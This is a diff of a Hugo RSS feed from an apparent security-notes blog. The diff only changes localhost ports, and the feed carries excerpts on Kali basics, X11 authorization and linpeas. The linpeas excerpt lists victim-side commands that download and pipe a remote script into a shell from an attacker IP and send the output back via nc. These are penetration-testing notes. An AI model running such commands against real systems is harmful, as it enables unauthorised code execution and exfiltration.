@@ -2,30 +2,30 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Linux on Owlglass</title>
-    <link>http://localhost:8080/tags/linux/</link>
+    <link>http://localhost:1313/tags/linux/</link>
     <description>Recent content in Linux on Owlglass</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <atom:link href="http://localhost:8080/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/tags/linux/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Kali Linux - Basics</title>
-      <link>http://localhost:8080/posts/kali_basics/</link>
+      <link>http://localhost:1313/posts/kali_basics/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:8080/posts/kali_basics/</guid>
+      <guid>http://localhost:1313/posts/kali_basics/</guid>
       <description>&lt;p&gt;:ID:       cb51a9d3-842b-4b10-ae56-2d18573b5f3e&lt;/p&gt;&#xA;&lt;p&gt;:END:&lt;/p&gt;&#xA;&lt;h2 id=&#34;filesystem&#34;&gt;Filesystem&lt;/h2&gt;&#xA;&lt;p&gt;FHS - Filesystem Hierarchy Standard - conventions used for layout of a UNIX system &lt;a href=&#34;https://wiki.linuxfoundation.org/lsb/fhs&#34;&gt;LinuxFoundation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;/bin : basic programs like &lt;code&gt;ls&lt;/code&gt;, &lt;code&gt;cd&lt;/code&gt;, &lt;code&gt;cat&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;/sbin : system programs like &lt;code&gt;fdisk&lt;/code&gt;, &lt;code&gt;makefs&lt;/code&gt;, &lt;code&gt;sysctl&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;/etc : configuration files bk&lt;/li&gt;&#xA;&lt;li&gt;/tmp : temporary files, typically deleted on boot&lt;/li&gt;&#xA;&lt;li&gt;/usr/bin : applications like &lt;code&gt;apt&lt;/code&gt;, &lt;code&gt;ncat&lt;/code&gt;, &lt;code&gt;nmap&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;/usr/share : application support and data files&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;basic-linux-commands&#34;&gt;Basic Linux commands&lt;/h2&gt;&#xA;&lt;h2 id=&#34;finding-files&#34;&gt;Finding files&lt;/h2&gt;&#xA;&lt;h3 id=&#34;which&#34;&gt;&lt;code&gt;which&lt;/code&gt;&lt;/h3&gt;&#xA;&lt;p&gt;searches through directories in the &lt;code&gt;$PATH&lt;/code&gt; environment variable for a given file name; returns the full path to the file if a match is found&lt;/p&gt;</description>
     </item>
     <item>
       <title>linpeas</title>
-      <link>http://localhost:8080/posts/linpeas/</link>
+      <link>http://localhost:1313/posts/linpeas/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:8080/posts/linpeas/</guid>
+      <guid>http://localhost:1313/posts/linpeas/</guid>
       <description>&lt;p&gt;See carlospolop : &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng&#34;&gt;PEASS-ng&lt;/a&gt;  &lt;a href=&#34;https://book.hacktricks.xyz/&#34;&gt;hacktricks&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;execution&#34;&gt;Execution:&lt;/h2&gt;&#xA;&lt;p&gt;Run from memory and send back to attacker:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Local network&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python -m SimpleHTTPServer &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl 10.10.10.10/linpeas.sh | sh &lt;span style=&#34;color:#75715e&#34;&gt;#Victim&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Without curl&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nc -q &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &amp;lt; linpeas.sh &lt;span style=&#34;color:#75715e&#34;&gt;#Host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh &lt;span style=&#34;color:#75715e&#34;&gt;#Victim&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Excute from memory and send output back to the host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt; | tee linpeas.out &lt;span style=&#34;color:#75715e&#34;&gt;#Host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Victim&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     <item>
       <title>X11 Authorization</title>
-      <link>http://localhost:8080/posts/x11_authorization/</link>
+      <link>http://localhost:1313/posts/x11_authorization/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:8080/posts/x11_authorization/</guid>
+      <guid>http://localhost:1313/posts/x11_authorization/</guid>
       <description>&lt;h2 id=&#34;x11-authorization&#34;&gt;X11 Authorization&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518&#34;&gt;https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Well, first of all there is a file ~/.Xauthority on the machine. Notice that (usually on machine with GUI) wrong permissions of this file, can cause a login screen loop&amp;hellip; (took me hours to understand that).&lt;/p&gt;&#xA;&lt;p&gt;As you mentioned there are 5 mechanisms:&lt;/p&gt;&#xA;&lt;p&gt;Host access: the server has host access list (if a network address exists in this list, the connection is permitted). the list is managed using xhost command. NOTE: this doesn&amp;rsquo;t allow more than a single connection simultaneously. I don&amp;rsquo;t know more about this method because I don&amp;rsquo;t really used it. but you can see man Xserver GRANTING ACCESS section :)&lt;/p&gt;</description>
     </item>
   </channel>
